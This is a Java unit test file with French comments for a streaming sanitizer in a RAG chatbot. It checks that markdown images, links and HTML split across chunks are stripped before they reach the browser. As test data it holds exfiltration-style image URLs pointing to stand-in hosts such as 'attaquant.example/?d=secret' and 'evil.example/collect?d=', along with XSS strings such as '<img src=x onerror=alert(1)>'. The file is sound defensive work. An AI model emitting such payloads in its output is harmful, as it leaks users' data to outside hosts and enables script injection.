package org.maksaad.recouvchatbot_rag.support;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.ArrayList;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class StreamingSanitizerTest {

    /** Emet tous les morceaux puis la fin, comme ChatAiService, et renvoie ce que le navigateur recevrait. */
    private static List<String> run(int max, String... chunks) {
        StreamingSanitizer s = new StreamingSanitizer(max);
        List<String> deltas = new ArrayList<>();
        for (String c : chunks) {
            deltas.add(s.push(c));
        }
        deltas.add(s.finish());
        return deltas;
    }

    private static String joined(List<String> deltas) {
        return String.join("", deltas);
    }

    @Test
    void unTexteOrdinaireEstEmisAuFilDeLEauSansRetard() {
        List<String> deltas = run(6000, "Le délai ", "d'opposition ", "est de 15 jours.");

        assertEquals("Le délai ", deltas.get(0), "le premier morceau part immediatement");
        assertEquals("Le délai d'opposition est de 15 jours.", joined(deltas));
    }

    /**
     * Le cas dangereux : l'image est coupee en plusieurs morceaux. Le debut "![](https://attaquant" ne
     * doit JAMAIS etre emis avant d'avoir vu la fin de la construction.
     */
    @Test
    void uneImageCoupeeEnPlusieursMorceauxNEstJamaisEmise() {
        List<String> deltas = run(6000, "Solde : 100 DH ![](https://att", "aquant.example/?d=secret", ") merci.");

        assertFalse(deltas.get(0).contains("!["), "le debut de l'image ne doit pas partir : " + deltas.get(0));
        assertTrue(deltas.stream().noneMatch(d -> d.contains("attaquant")), deltas.toString());
        assertEquals("Solde : 100 DH  merci.", joined(deltas));
    }

    @Test
    void unLienNeGardeQueSonTexteMemeSiIlArriveParMorceaux() {
        List<String> deltas = run(6000, "Voir [la fa", "cture](https://evil.example/x) pour le détail.");

        assertTrue(deltas.stream().noneMatch(d -> d.contains("evil")), deltas.toString());
        assertEquals("Voir la facture pour le détail.", joined(deltas));
    }

    @Test
    void uneBaliseHtmlCoupeeEstRetenueEtSupprimee() {
        List<String> deltas = run(6000, "Total <img src=\"https://ev", "il.example/p.png\"> 500 DH");

        assertTrue(deltas.stream().noneMatch(d -> d.contains("<img") || d.contains("evil")), deltas.toString());
        assertEquals("Total  500 DH", joined(deltas));
    }

    @Test
    void unPointDExclamationOuUnCrochetOrdinaireNeBloquePasLeFlux() {
        List<String> deltas = run(6000, "Attention ! ", "Voir l'article [12] ", "et [13], puis fin.");

        assertEquals("Attention ! Voir l'article [12] et [13], puis fin.", joined(deltas));
        assertEquals("Attention ! ", deltas.get(0));
    }

    @Test
    void unSuperieurOuInferieurDansUneComparaisonNEstPasUneBalise() {
        List<String> deltas = run(6000, "Le montant est < 500 DH ", "et > 100 DH.");

        assertEquals("Le montant est < 500 DH et > 100 DH.", joined(deltas));
    }

    @Test
    void uneConstructionJamaisFermeeEstNettoyeeEtLiberee_A_LaFin() {
        List<String> deltas = run(6000, "Résultat ![](https://evil.example/collect?d=", "sans parenthese fermante");

        assertTrue(deltas.get(0).isEmpty() && deltas.get(1).isEmpty() || !joined(deltas.subList(0, 2)).contains("evil"));
        assertFalse(joined(deltas).contains("evil"), "meme non fermee, l'adresse ne doit jamais atteindre le navigateur");
    }

    @Test
    void uneReponseDemesureeEstTronqueeEtLeFluxSArrete() {
        List<String> deltas = run(20, "x".repeat(15), "y".repeat(15), "z".repeat(15));

        String tout = joined(deltas);
        assertTrue(tout.startsWith("x".repeat(15) + "y".repeat(5)));
        assertTrue(tout.endsWith("[Réponse tronquée]"));
        assertFalse(tout.contains("z"), "rien apres la limite");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "Bonjour ![x](https://evil.example/a.png) fin",
            "Cliquez [ici](https://evil.example) ou [là](https://evil2.example) fin",
            "<script>alert(1)</script> fin",
            "Texte <b>gras</b> et <img src=x onerror=alert(1)> fin",
            "[ref]: https://evil.example/pixel\ntexte"})
    void quelleQueSoitLaDecoupeLeResultatNeContientJamaisDeContenuActif(String texte) {
        // Decoupe en morceaux de 1, 2, 3... caracteres : toutes les frontieres possibles sont essayees.
        for (int taille = 1; taille <= 7; taille++) {
            String[] chunks = decouper(texte, taille);
            String sortie = joined(run(6000, chunks));

            assertFalse(sortie.contains("evil"), "taille " + taille + " -> " + sortie);
            assertFalse(sortie.contains("<script") || sortie.contains("<img") || sortie.contains("onerror"),
                    "taille " + taille + " -> " + sortie);
        }
    }

    @Test
    void lesMorceauxVidesOuNullsSontIgnores() {
        StreamingSanitizer s = new StreamingSanitizer(100);

        assertEquals("", s.push(null));
        assertEquals("", s.push(""));
        assertEquals("ok", s.push("ok") + s.finish());
    }

    private static String[] decouper(String texte, int taille) {
        List<String> morceaux = new ArrayList<>();
        for (int i = 0; i < texte.length(); i += taille) {
            morceaux.add(texte.substring(i, Math.min(texte.length(), i + taille)));
        }
        return morceaux.toArray(new String[0]);
    }
}
